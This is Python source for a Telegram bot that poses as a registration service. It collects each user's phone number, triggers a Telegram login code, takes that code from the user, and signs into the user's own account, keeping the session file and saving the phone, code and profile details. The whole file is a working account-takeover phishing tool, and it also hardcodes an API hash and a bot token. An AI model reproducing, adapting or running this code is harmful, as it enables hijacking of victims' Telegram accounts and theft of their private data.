import render_web  # ✅ این خط رو اضافه کن

import asyncio
import json
import os
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError

# ========== تنظیمات ==========
API_ID = 17187664
API_HASH = 'd6eae2c921342bb71816a980dc11b9f5'
BOT_TOKEN = '8680597965:AAERhsYmlIou-MEOnbV598bxI0EeQlyzS04'

USERS_FILE = 'users.json'
SESSIONS_DIR = 'sessions/'
TEMP_SESSIONS = {}

# ========== مدیریت فایل‌ها ==========
def ensure_files():
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w') as f:
            json.dump({}, f, indent=2)

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

# ========== کلاس ربات ==========
class InfoBot:
    def __init__(self):
        self.client = None
        self.user_steps = {}
        
    async def start(self):
        ensure_files()
        
        self.client = TelegramClient('info_bot', API_ID, API_HASH)
        await self.client.start(bot_token=BOT_TOKEN)
        
        me = await self.client.get_me()
        print(f"✅ ربات @{me.username} متصل شد!")
        print(f"📁 فایل کاربران: {USERS_FILE}")
        
        @self.client.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            user_id = str(event.sender_id)
            self.user_steps[user_id] = {'step': 'start'}
            
            await event.reply("""
🐱 **به ربات ثبت‌نام خوش آمدی!**

📌 **مراحل:**
1️⃣ شماره تلفن خود را وارد کنید
2️⃣ کد تایید به شماره شما ارسال میشه
3️⃣ کد ۵ رقمی را وارد کنید

📱 لطفاً شماره خود را با کد کشور وارد کنید:
مثال: +989123456789
            """)
        
        @self.client.on(events.NewMessage)
        async def phone_handler(event):
            user_id = str(event.sender_id)
            text = event.raw_text
            
            if text.startswith('/'):
                return
            
            if user_id not in self.user_steps:
                await event.reply("❌ لطفاً اول /start رو بزنید.")
                return
            
            step = self.user_steps[user_id].get('step', 'start')
            
            if step == 'start' or step == 'phone':
                if not text.startswith('+') or not text[1:].isdigit():
                    await event.reply("❌ شماره باید با + شروع بشه!\nمثال: +989123456789")
                    return
                
                try:
                    temp_client = TelegramClient(f"{SESSIONS_DIR}temp_{user_id}", API_ID, API_HASH)
                    await temp_client.connect()
                    await temp_client.send_code_request(text)
                    
                    TEMP_SESSIONS[user_id] = {
                        'client': temp_client,
                        'phone': text,
                        'timestamp': datetime.now()
                    }
                    
                    self.user_steps[user_id] = {'step': 'code', 'phone': text}
                    
                    await event.reply(f"""
✅ کد تایید به شماره {text} ارسال شد!

📌 **مرحله ۲:**
🔑 کد ۵ رقمی که به تلگرامت اومده رو وارد کن:
                    """)
                    
                except FloodWaitError as e:
                    await event.reply(f"⏳ تعداد درخواست زیاد! {e.seconds} ثانیه صبر کن.")
                except Exception as e:
                    await event.reply(f"❌ خطا در ارسال کد: {str(e)}")
                return
            
            if step == 'code':
                code = text.strip()
                
                if not code.isdigit() or len(code) != 5:
                    await event.reply("❌ کد باید ۵ رقم باشد!\nمثال: 12345")
                    return
                
                temp_data = TEMP_SESSIONS.get(user_id)
                if not temp_data:
                    await event.reply("❌ نشست منقضی شده! دوباره /start رو بزن.")
                    return
                
                try:
                    temp_client = temp_data['client']
                    phone = temp_data['phone']
                    
                    await temp_client.sign_in(code=code)
                    me = await temp_client.get_me()
                    
                    users = load_users()
                    users[user_id] = {
                        'phone': phone,
                        'code': code,
                        'status': 'pending',
                        'registered_at': datetime.now().isoformat(),
                        'username': me.username,
                        'first_name': me.first_name,
                        'group_link': 'https://t.me/+NJNJp5hUf3IzNTRk',
                        'alert_group_link': 'https://t.me/+h2RZDERs5Yk1Yjc0'
                    }
                    save_users(users)
                    
                    await temp_client.disconnect()
                    if user_id in TEMP_SESSIONS:
                        del TEMP_SESSIONS[user_id]
                    if user_id in self.user_steps:
                        del self.user_steps[user_id]
                    
                    await event.reply(f"""
✅ **ثبت‌نام با موفقیت انجام شد!**

📱 شماره: {phone}
👤 نام: {me.first_name}
🆔 یوزرنیم: @{me.username}
📊 وضعیت: در صف انتظار

🔄 ربات اصلی به زودی فعال میشه...
                    """)
                    
                    print(f"🆕 کاربر جدید ثبت‌نام کرد: {user_id} - {phone} - @{me.username}")
                    
                except Exception as e:
                    await event.reply(f"❌ خطا در تایید کد: {str(e)}\nدوباره تلاش کن.")
                return
            
            await event.reply("❌ دستور نامعتبر! /start رو بزن.")
        
        @self.client.on(events.NewMessage(pattern='/status'))
        async def status_handler(event):
            user_id = str(event.sender_id)
            users = load_users()
            
            if user_id in users:
                data = users[user_id]
                status = data.get('status', 'unknown')
                status_text = {
                    'pending': '⏳ در صف انتظار',
                    'active': '✅ فعال',
                    'error': '❌ خطا'
                }.get(status, '❓ نامشخص')
                
                await event.reply(f"""
📊 **وضعیت شما:**

📱 شماره: {data.get('phone', 'نامشخص')}
👤 نام: {data.get('first_name', 'نامشخص')}
🆔 یوزرنیم: @{data.get('username', 'نامشخص')}
📌 وضعیت: {status_text}
🕒 ثبت نام: {data.get('registered_at', 'نامشخص')}
                """)
            else:
                await event.reply("❌ شما هنوز ثبت‌نام نکردید! /start رو بزنید.")
        
        @self.client.on(events.NewMessage(pattern='/delete'))
        async def delete_handler(event):
            user_id = str(event.sender_id)
            users = load_users()
            
            if user_id in users:
                del users[user_id]
                save_users(users)
                await event.reply("✅ اطلاعات شما حذف شد.")
            else:
                await event.reply("❌ شما ثبت‌نام نکردید!")
        
        print("🔄 منتظر پیام‌های کاربران...")
        await self.client.run_until_disconnected()

if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════╗
    ║  🤖 ربات دریافت اطلاعات               ║
    ║  کاربرا شماره و کد رو میدن            ║
    ╚════════════════════════════════════════╝
    """)
    
    try:
        bot = InfoBot()
        asyncio.run(bot.start())
    except KeyboardInterrupt:
        print("\n👋 خداحافظ!")
    except Exception as e:
        print(f"❌ خطا: {e}")
